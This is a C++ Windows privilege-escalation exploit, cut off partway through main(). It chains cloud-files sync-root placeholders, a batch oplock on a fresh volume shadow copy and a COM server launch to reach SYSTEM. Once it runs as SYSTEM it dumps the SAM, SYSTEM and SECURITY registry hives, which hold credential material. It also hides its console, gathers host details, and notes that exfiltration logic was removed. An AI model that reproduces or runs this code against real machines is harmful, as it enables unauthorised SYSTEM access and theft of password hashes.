// The sun doesn't ask for permission to rise.
// And neither should windows 

#define UNICODE
#define _UNICODE
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <string>
#include <Windows.h>
#include <conio.h>
#include <winternl.h>
#include <ntstatus.h>
#include <vector>

// Configuration constants
#define AV_TIMEOUT_MS 240000      // how long we wait for the sun to rise
#define RETRY_SLEEP_MS 20          // patience between solar flares
#define RETRY_MAX_COUNT 1000       // even the sun has limits
#define FINAL_SLEEP_MS 2000        // bask in the aftermath

void LogToFile(const std::wstring& msg) {
    wchar_t logPath[MAX_PATH];
    ExpandEnvironmentStringsW(L"%TEMP%\\poc_research.log", logPath, MAX_PATH);
    FILE* f = _wfopen(logPath, L"a+");
    if (f) {
        fwprintf(f, L"%ls\n", msg.c_str());
        fclose(f);
    }
}


typedef struct _CF_CONNECTION_KEY {
    LONGLONG Internal;
} CF_CONNECTION_KEY;

typedef struct _CF_FS_METADATA {
    FILE_BASIC_INFO BasicInfo;
    LARGE_INTEGER FileSize;
} CF_FS_METADATA;

typedef enum CF_PLACEHOLDER_CREATE_FLAGS {
    CF_PLACEHOLDER_CREATE_FLAG_NONE = 0x00000000,
    CF_PLACEHOLDER_CREATE_FLAG_DISABLE_ON_DEMAND_POPULATION = 0x00000001,
    CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC = 0x00000002,
    CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE = 0x00000004,
    CF_PLACEHOLDER_CREATE_FLAG_ALWAYS_FULL = 0x00000008,
} CF_PLACEHOLDER_CREATE_FLAGS;

typedef struct CF_PLACEHOLDER_CREATE_INFO {
    LPCWSTR RelativeFileName;
    CF_FS_METADATA FsMetadata;
    LPCVOID FileIdentity;
    DWORD FileIdentityLength;
    DWORD Flags; // Changed from enum
    HRESULT Result;
    USN CreateUsn;
} CF_PLACEHOLDER_CREATE_INFO;

typedef enum CF_REGISTER_FLAGS {
    CF_REGISTER_FLAG_NONE = 0x00000000,
    CF_REGISTER_FLAG_UPDATE = 0x00000001,
    CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT = 0x00000002,
    CF_REGISTER_FLAG_MARK_IN_SYNC_ON_ROOT = 0x00000004,
} CF_REGISTER_FLAGS;

typedef enum CF_HYDRATION_POLICY_PRIMARY {
    CF_HYDRATION_POLICY_PARTIAL = 0,
    CF_HYDRATION_POLICY_PROGRESSIVE = 1,
    CF_HYDRATION_POLICY_FULL = 2,
    CF_HYDRATION_POLICY_ALWAYS_FULL = 3,
} CF_HYDRATION_POLICY_PRIMARY;

typedef enum CF_HYDRATION_POLICY_MODIFIER {
    CF_HYDRATION_POLICY_MODIFIER_NONE = 0x0000,
    CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED = 0x0001,
    CF_HYDRATION_POLICY_MODIFIER_STREAMING_ALLOWED = 0x0002,
    CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED = 0x0004,
    CF_HYDRATION_POLICY_MODIFIER_ALLOW_FULL_RESTART_HYDRATION = 0x0008,
} CF_HYDRATION_POLICY_MODIFIER;

typedef struct CF_HYDRATION_POLICY {
    USHORT Primary;
    USHORT Modifier;
} CF_HYDRATION_POLICY;

typedef enum CF_POPULATION_POLICY_PRIMARY {
    CF_POPULATION_POLICY_PARTIAL = 0,
    CF_POPULATION_POLICY_FULL = 2,
    CF_POPULATION_POLICY_ALWAYS_FULL = 3,
} CF_POPULATION_POLICY_PRIMARY;

typedef enum CF_POPULATION_POLICY_MODIFIER {
    CF_POPULATION_POLICY_MODIFIER_NONE = 0x0000,
} CF_POPULATION_POLICY_MODIFIER;

typedef struct CF_POPULATION_POLICY {
    USHORT Primary;
    USHORT Modifier;
} CF_POPULATION_POLICY;

typedef enum CF_PLACEHOLDER_MANAGEMENT_POLICY {
    CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT = 0x00000000,
    CF_PLACEHOLDER_MANAGEMENT_POLICY_CREATE_UNRESTRICTED = 0x00000001,
    CF_PLACEHOLDER_MANAGEMENT_POLICY_CONVERT_TO_UNRESTRICTED = 0x00000002,
    CF_PLACEHOLDER_MANAGEMENT_POLICY_UPDATE_UNRESTRICTED = 0x00000004,
} CF_PLACEHOLDER_MANAGEMENT_POLICY;

typedef enum CF_INSYNC_POLICY {
    CF_INSYNC_POLICY_NONE = 0x00000000,
} CF_INSYNC_POLICY;

typedef enum CF_HARDLINK_POLICY {
    CF_HARDLINK_POLICY_NONE = 0x00000000,
    CF_HARDLINK_POLICY_ALLOWED = 0x00000001,
} CF_HARDLINK_POLICY;

typedef struct CF_SYNC_POLICIES {
    ULONG StructSize;
    CF_HYDRATION_POLICY Hydration;
    CF_POPULATION_POLICY Population;
    DWORD InSync;
    CF_HARDLINK_POLICY HardLink;
    CF_PLACEHOLDER_MANAGEMENT_POLICY PlaceholderManagement;
} CF_SYNC_POLICIES;

typedef struct CF_SYNC_REGISTRATION {
    ULONG StructSize;
    LPCWSTR ProviderName;
    LPCWSTR ProviderVersion;
    LPCVOID SyncRootIdentity;
    DWORD SyncRootIdentityLength;
    LPCVOID FileIdentity;
    DWORD FileIdentityLength;
    GUID ProviderId;
} CF_SYNC_REGISTRATION;

typedef enum CF_CALLBACK_TYPE {
    CF_CALLBACK_TYPE_NONE = 0xffffffff
} CF_CALLBACK_TYPE;

typedef struct CF_CALLBACK_REGISTRATION {
    DWORD Type; // Changed from enum
    void* Callback;
} CF_CALLBACK_REGISTRATION;

typedef enum CF_CONNECT_FLAGS {
    CF_CONNECT_FLAG_NONE = 0x00000000,
    CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO = 0x00000002,
    CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH = 0x00000004,
    CF_CONNECT_FLAG_BLOCK_SELF_IMPLICIT_HYDRATION = 0x00000008,
} CF_CONNECT_FLAGS;

typedef enum CF_CREATE_FLAGS {
    CF_CREATE_FLAG_NONE = 0x00000000,
    CF_CREATE_FLAG_STOP_ON_ERROR = 0x00000001,
} CF_CREATE_FLAGS;

typedef HRESULT (WINAPI* _CfRegisterSyncRoot)(LPCWSTR SyncRootPath, const CF_SYNC_REGISTRATION* Registration, const CF_SYNC_POLICIES* Policies, DWORD RegisterFlags);
typedef HRESULT (WINAPI* _CfConnectSyncRoot)(LPCWSTR SyncRootPath, const CF_CALLBACK_REGISTRATION* CallbackTable, LPCVOID CallbackContext, DWORD ConnectFlags, CF_CONNECTION_KEY* ConnectionKey);
typedef HRESULT (WINAPI* _CfCreatePlaceholders)(LPCWSTR BaseDirectoryPath, CF_PLACEHOLDER_CREATE_INFO* PlaceholderArray, DWORD PlaceholderCount, DWORD CreateFlags, PDWORD EntriesProcessed);

_CfRegisterSyncRoot pCfRegisterSyncRoot = NULL;
_CfConnectSyncRoot pCfConnectSyncRoot = NULL;
_CfCreatePlaceholders pCfCreatePlaceholders = NULL;

void InitCldApi() {
    HMODULE hCldApi = LoadLibraryW(L"cldapi.dll");
    if (hCldApi) {
        pCfRegisterSyncRoot = (_CfRegisterSyncRoot)GetProcAddress(hCldApi, "CfRegisterSyncRoot");
        pCfConnectSyncRoot = (_CfConnectSyncRoot)GetProcAddress(hCldApi, "CfConnectSyncRoot");
        pCfCreatePlaceholders = (_CfCreatePlaceholders)GetProcAddress(hCldApi, "CfCreatePlaceholders");
    }
}

bool EnablePrivilege(LPCWSTR lpPrivilege) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValueW(NULL, lpPrivilege, &luid)) { CloseHandle(hToken); return false; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { CloseHandle(hToken); return false; }
    CloseHandle(hToken);
    return (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
}

void SaveHive(HKEY hKey, LPCWSTR subKey, LPCWSTR filename) {
    HKEY hk;
    if (RegOpenKeyExW(hKey, subKey, 0, KEY_READ, &hk) != ERROR_SUCCESS) {
        LogToFile(L"Clouds blocking: " + std::wstring(subKey));
        return;
    }
    DeleteFileW(filename);
    LONG res = RegSaveKeyExW(hk, filename, NULL, REG_LATEST_FORMAT);
    if (res == ERROR_SUCCESS) {
        LogToFile(L"Absorbed " + std::wstring(subKey) + L" into " + std::wstring(filename));
    } else {
        wchar_t err[256];
        swprintf(err, L"Solar flare failed for %ls -> %ls, code: %ld", subKey, filename, res);
        LogToFile(err);
        // If error is 3 (ERROR_PATH_NOT_FOUND), the directory is likely missing
        if (res == 3) {
            wprintf(L"The sky is missing for %ls.\n", subKey);
        }
    }
    RegCloseKey(hk);
}


// #pragma comment(lib,"synchronization.lib")
// #pragma comment(lib,"sas.lib")
// #pragma comment(lib,"ntdll.lib")
// #pragma comment(lib,"CldApi.lib")


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;


typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)



HMODULE h = LoadLibrary(L"ntdll.dll");
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
    PHANDLE            DirectoryHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
    ) = (NTSTATUS(WINAPI*)(
        PHANDLE            DirectoryHandle,
        ACCESS_MASK        DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes
        ))GetProcAddress(hm, "NtOpenDirectoryObject");;
NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
    HANDLE  DirectoryHandle,
    PVOID   Buffer,
    ULONG   Length,
    BOOLEAN ReturnSingleEntry,
    BOOLEAN RestartScan,
    PULONG  Context,
    PULONG  ReturnLength
    ) = (NTSTATUS(WINAPI*)(
        HANDLE  DirectoryHandle,
        PVOID   Buffer,
        ULONG   Length,
        BOOLEAN ReturnSingleEntry,
        BOOLEAN RestartScan,
        PULONG  Context,
        PULONG  ReturnLength
        ))GetProcAddress(hm, "NtQueryDirectoryObject");
NTSTATUS(WINAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass
    ) = (NTSTATUS(WINAPI*)(
        HANDLE                 FileHandle,
        PIO_STATUS_BLOCK       IoStatusBlock,
        PVOID                  FileInformation,
        ULONG                  Length,
        FILE_INFORMATION_CLASS FileInformationClass
        ))GetProcAddress(hm, "NtSetInformationFile");

NTSTATUS(WINAPI* _RtlGetCompressionWorkSpaceSize)(
    USHORT CompressionFormatAndEngine,
    PULONG CompressBufferWorkSpaceSize,
    PULONG CompressFragmentWorkSpaceSize
    ) = (NTSTATUS(WINAPI*)(USHORT, PULONG, PULONG))GetProcAddress(hm, "RtlGetCompressionWorkSpaceSize");
NTSTATUS(WINAPI* _RtlCompressBuffer)(
    USHORT CompressionFormatAndEngine,
    PUCHAR UncompressedBuffer,
    ULONG  UncompressedBufferSize,
    PUCHAR CompressedBuffer,
    ULONG  CompressedBufferSize,
    ULONG  UncompressedChunkSize,
    PULONG FinalCompressedSize,
    PVOID  WorkSpace
    ) = (NTSTATUS(WINAPI*)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID))GetProcAddress(hm, "RtlCompressBuffer");

VOID(WINAPI* _WakeByAddressAll)(
    PVOID Address
    ) = (VOID(WINAPI*)(PVOID))GetProcAddress(hm, "WakeByAddressAll");

BOOL(WINAPI* _WaitOnAddress)(
    PVOID Address,
    PVOID CompareAddress,
    SIZE_T AddressSize,
    DWORD dwMilliseconds
    ) = (BOOL(WINAPI*)(PVOID, PVOID, SIZE_T, DWORD))GetProcAddress(hm, "WaitOnAddress");



struct LLShadowVolumeNames
{
    wchar_t* name;
    LLShadowVolumeNames* next;
};
void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
    while (First)
    {
        free(First->name);
        LLShadowVolumeNames* next = First->next;
        free(First);
        First = next;
    }
}

LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber)
{
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
    void* emptybuff = NULL;
    LLShadowVolumeNames* LLVSSfirst = NULL;
    LLShadowVolumeNames* LLVSScurrent = NULL;
    NTSTATUS stat = STATUS_SUCCESS;
    ULONG scanctx = 0;
    ULONG reqsz = 0;
    ULONG retsz = 0;

    if (!criticalerr || !vscnumber)
        return NULL;

    *vscnumber = 0;
    reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo)
    {
        printf("Not enough solar energy.\n");
        *criticalerr = true;
        goto cleanup;
    }
    ZeroMemory(objdirinfo, reqsz);
    
    do
    {
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("The cosmos is unresponsive : 0x%0.8X\n", stat);
            *criticalerr = true;
            goto cleanup;
        }

        free(objdirinfo);
        objdirinfo = NULL;
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Not enough solar energy.\n");
            *criticalerr = true;
            goto cleanup;
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    
    emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    if (!emptybuff)
    {
        printf("Starlight insufficient.\n");
        *criticalerr = true;
        goto cleanup;
    }
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    
    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            break;
        }
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    (*vscnumber)++;
                    if (LLVSScurrent)
                    {
                        LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSScurrent->next)
                        {
                            printf("Starlight insufficient.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSScurrent->next;
                        
                        // Buffer safety check
                        if (objdirinfo[i].Name.Length > MAX_PATH * sizeof(wchar_t)) {
                            printf("The star name is too long for this galaxy.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("The void consumes all.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
                    }
                    else
                    {
                        LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
                        if (!LLVSSfirst)
                        {
                            printf("Starlight insufficient.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
                        LLVSScurrent = LLVSSfirst;
                        
                        // Buffer safety check
                        if (objdirinfo[i].Name.Length > MAX_PATH * sizeof(wchar_t)) {
                            printf("The star name is too long for this galaxy.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        
                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                        if (!LLVSScurrent->name)
                        {
                            printf("The void consumes all.\n");
                            *criticalerr = true;
                            goto cleanup;
                        }
                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

                    }

                }
            }
        }
    }
    
cleanup:
    if (emptybuff) free(emptybuff);
    if (objdirinfo) free(objdirinfo);
    if (*criticalerr && LLVSSfirst) {
        DestroyVSSNamesList(LLVSSfirst);
        LLVSSfirst = NULL;
    }
    return LLVSSfirst;
}


HANDLE gevent = NULL;
CRITICAL_SECTION geventLock;

void InitGlobalSync() {
    InitializeCriticalSection(&geventLock);
    gevent = CreateEvent(NULL, FALSE, NULL, NULL);
}

void CleanupGlobalSync() {
    if (gevent) {
        CloseHandle(gevent);
        gevent = NULL;
    }
    DeleteCriticalSection(&geventLock);
}

DWORD WINAPI ShadowCopyFinderThread(wchar_t* foo)
{

    wchar_t devicepath[] = L"\\Device";
    UNICODE_STRING udevpath = { 0 };
    RtlInitUnicodeString(&udevpath, devicepath);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS stat = STATUS_SUCCESS;
    HANDLE hobjdir = NULL;
    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
    if (stat)
    {
        printf("Cannot see the horizon : 0x%0.8X", stat);
        return 1;
    }
    bool criterr = false;
    int vscnum = 0;
    LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum);

    if (criterr)
    {
        printf("The shadows refuse to reveal themselves.\n");
        ExitProcess(1);
    }
    

    bool restartscan = false;
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo)
    {
        printf("Not enough solar energy.\n");
        ExitProcess(1);
    }
    ZeroMemory(objdirinfo, reqsz);
    stat = STATUS_SUCCESS;
    bool srchfound = false;
scanagain:
    do
    {
        scanctx = 0;
        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
        if (stat == STATUS_SUCCESS)
            break;
        else if (stat != STATUS_MORE_ENTRIES)
        {
            printf("The cosmos is unresponsive : 0x%0.8X\n", stat);
            ExitProcess(1);
        }

        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo)
        {
            printf("Not enough solar energy.\n");
            ExitProcess(1);
        }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);
    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    if (!emptybuff)
    {
        printf("The void consumes all.");
        ExitProcess(1);
    }
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
    wchar_t newvsspath[MAX_PATH] = { 0 };
    wcscpy(newvsspath, L"\\Device\\");

    for (ULONG i = 0; i < ULONG_MAX; i++)
    {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
        {
            free(emptybuff);
            emptybuff = NULL;
            break;
        }
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
        {
            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
            {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
                {
                    // check against the list if there this is a unique VS Copy
                    LLShadowVolumeNames* current = vsinitial;
                    bool found = false;
                    while (current)
                    {
                        if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
                        {
                            found = true;
                            break;
                        }
                        current = current->next;
                    }
                    if (found)
                        continue;
                    else
                    {
                        srchfound = true;
                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
                        break;
                    }
                }
            }
        }
    }

    if (!srchfound) {
        Sleep(500); // Wait for AV to trigger shadow copy
        restartscan = true;
        goto scanagain;
    }
    if (objdirinfo)
        free(objdirinfo);
    NtClose(hobjdir);

    wchar_t malpath[MAX_PATH] = { 0 };
    wcscpy(malpath, newvsspath);
    wcscat(malpath, &foo[2]);
    UNICODE_STRING _malpath = { 0 };
    RtlInitUnicodeString(&_malpath, malpath);
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    HANDLE hlk = NULL;
    int retryCount = 0;
retry:
    if (retryCount++ > RETRY_MAX_COUNT) {
        printf("The sun waited too long... night falls.\n");
        return 1;
    }
    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, 0, 0, 0);
    if (stat == STATUS_NO_SUCH_DEVICE) {
        Sleep(100);
        goto retry;
    }
    if (stat)
    {
        printf("Cannot grasp the shadow : 0x%0.8X\n", stat);
        return 1;

    }
    printf("The sun is shining...\n");
    
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    printf("Casting a solar flare...\n");
    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("The flare fizzled out : %d\n", GetLastError());
        CloseHandle(ovd.hEvent);
        return 0;
    }
    printf("Solar flare holding...\n");

    DWORD nbytes = 0;
    printf("Signaling sunrise...\n");
    SetEvent(gevent); 
    
    // Wait for main thread to signal that it's done with its first stage
    // We use a separate event or just gevent if main resets it
    printf("Waiting for high noon...\n");
    WaitForSingleObject(gevent, INFINITE);
    printf("Dawn breaks. Releasing the light...\n");

    CloseHandle(hlk);
    CloseHandle(ovd.hEvent);

    return ERROR_SUCCESS;
}


void rev(char* s) {

    // Initialize l and r pointers
    int l = 0;
    int r = strlen(s) - 1;
    char t;

    // Swap characters till l and r meet
    while (l < r) {

        // Swap characters
        t = s[l];
        s[l] = s[r];
        s[r] = t;

        // Move pointers towards each other
        l++;
        r--;
    }
}


void DoCloudStuff(const wchar_t* syncroot, const wchar_t* filename, DWORD filesz = 0x1000)
{

    CF_SYNC_REGISTRATION cfreg = { 0 };
    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfreg.ProviderName = L"CloudSyncProvider";
    cfreg.ProviderVersion = L"1.0";
    CF_SYNC_POLICIES syncpolicy = { 0 };
    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
    if (!pCfRegisterSyncRoot) return;
    HRESULT hs = pCfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (hs)
    {
        printf("The clouds won't part : 0x%0.8X\n", hs);
        return;
    }

    CF_CALLBACK_REGISTRATION callbackreg[1];
    callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
    void* callbackctx = NULL; 
    CF_CONNECTION_KEY cfkey = { 0 };
    if (!pCfConnectSyncRoot) return;
    hs = pCfConnectSyncRoot(syncroot, callbackreg, callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
    if (hs)
    {
        printf("Cannot sync with the sky : 0x%0.8X\n", hs);
        return;
    }

    SYSTEMTIME systime = { 0 };
    FILETIME filetime = { 0 };
    GetSystemTime(&systime);
    SystemTimeToFileTime(&systime, &filetime);

    FILE_BASIC_INFO filebasicinfo = { 0 };
    filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
    CF_FS_METADATA fsmetadata = { filebasicinfo, {filesz} };
    CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
    placeholder[0].RelativeFileName = filename;
    placeholder[0].FsMetadata = fsmetadata;


    GUID uid = { 0 };
    wchar_t wuid[100] = {0};
    CoCreateGuid(&uid);
    StringFromGUID2(uid, wuid,100);
    placeholder[0].FileIdentity = wuid;
    placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    DWORD processedentries = 0;
    //WaitForSingleObject(hevent, INFINITE);
    if (!pCfCreatePlaceholders) return;
    hs = pCfCreatePlaceholders(syncroot, placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
    if (hs)
    {
        printf("The mirage failed to materialize : 0x%0.8X\n", hs);
        return;
    }
    return;


}


void HideConsole() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

// Exfiltration logic removed.


std::wstring GetSystemInfo() {
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computerName, &size);

    wchar_t userName[256];
    size = 256;
    GetUserNameW(userName, &size);

    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t timestamp[128];
    swprintf(timestamp, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    std::wstring info = L"Comp: ";
    info += computerName;
    info += L" | User: ";
    info += userName;
    info += L" | Time: ";
    info += timestamp;
    return info;
}
bool IsRunningAsLocalSystem() {
    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        return false;
    }
    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
    DWORD retsz = 0;
    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
    CloseHandle(htoken);
    if (!res) {
        free(tokenuser);
        return false;
    }
    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
    free(tokenuser);

    if (ret) {
        LogToFile(L"--- THE SUN HAS CONSUMED THE THRONE ---");
        wprintf(L"The sun now rules the kingdom.\n");
        
        EnablePrivilege(L"SeBackupPrivilege");
        
        // Save hives to System32
        SaveHive(HKEY_LOCAL_MACHINE, L"SAM", L"C:\\Windows\\System32\\sam.hiv");
        SaveHive(HKEY_LOCAL_MACHINE, L"SYSTEM", L"C:\\Windows\\System32\\system.hiv");
        SaveHive(HKEY_LOCAL_MACHINE, L"SECURITY", L"C:\\Windows\\System32\\security.hiv");
        
        wprintf(L"The harvest is complete.\n");
        wprintf(L"Nothing is hidden from the sun.\n");
        ExitProcess(0);
    }
    return ret;
}

void LaunchTierManagementEng()
{
    CoInitialize(NULL);
    GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
    void* ret = NULL;
    HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);
    

    CoUninitialize();
}

int main()
{
    InitCldApi();
    InitGlobalSync();
    
    // Check if already running as SYSTEM (e.g., from previous successful exploit)
    if (IsRunningAsLocalSystem()) {
        return 0; // Already exited in function
    }

    // Check if already deployed to System32 and we just need to trigger it
    wchar_t currentExe[MAX_PATH];
